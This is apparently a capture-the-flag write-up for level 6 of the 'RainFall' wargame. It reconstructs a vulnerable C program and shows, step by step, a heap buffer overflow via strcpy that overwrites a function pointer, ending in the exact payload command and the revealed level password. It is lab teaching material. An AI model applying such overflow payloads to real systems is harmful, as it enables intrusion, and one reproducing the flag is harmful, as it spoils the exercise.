# Level 6

## Answer
Our C source code generates the same assembly code as the original binary. Compile it as follows:
```
gcc -fno-stack-protector source.c
```

Let's take a look at the source code:
```c
#include <stdlib.h>
#include <string.h>

void n()
{
    system("/bin/cat /home/user/level7/.pass");
}

void m()
{
    puts("Nope");
}

int main(int ac, char **argv)
{
    int *buffer;
    void (**func)(void);

    buffer = (char *)malloc(64);
    func = (void (**)(void))malloc(4);

    *func = m;
    strcpy(buffer, argv[1]);
    (*func)();
}
```

Let's focus on the `main` function. It reads input from the command line then copies it to our buffer using `strcpy`, which is known to be unsafe due to its potential for causing buffer overflows, as it lacks a mechanism to limit the number of bytes copied.

Since we're interacting with the heap here we won't have to worry about the stack layout, in this case we'll have to overflow the buffer until we reach the function pointer and write the address of the `n` function to it.

We'll use `ltrace` to understand the memory allocations and calculate the size needed for the overflow:
```bash
$ ltrace ./level6 test
__libc_start_main(0x804847c, 2, 0xbffff7e4, 0x80484e0, 0x8048550 <unfinished ...>
malloc(64) = 0x0804a008
malloc(4) = 0x0804a050
[...]
```

We notice that the first memory block is allocated 64 bytes and the second one 4 bytes. We also notice that the address of the first block is `0x0804a008` and the address of the second one is `0x0804a050`.  
So we simply have to subtract the addresses to get the size of the overflow needed to reach the function pointer: `0x0804a050` - `0x0804a008` = 0x48 (72 in decimal)

Using gdb we find that that the address of the `n` function is `0x08048454`.

We can then craft our payload:
```
padding + address of n

"A"*72 + "\x08\x04\x84\x54"[::-1]
```

Let's run our payload:
```bash
level6@RainFall:~$ ./level6 `python -c 'print("0"*72 + "\x08\x04\x84\x54"[::-1])'`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

We are now level7! Let's move on to the next level.
